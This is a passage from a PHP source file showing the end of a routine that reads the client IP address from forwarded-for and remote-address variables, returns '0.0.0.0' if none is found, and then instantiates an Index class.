		}else if(getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")){
			$ip = getenv("HTTP_X_FORWARDED_FOR");
		}else if(getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")){
			$ip = getenv("REMOTE_ADDR");
		}else if(isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")){
			$ip = $_SERVER['REMOTE_ADDR'];
		}else{
			$ip = '0.0.0.0';
		}
		return $ip;
	}
}
new Index;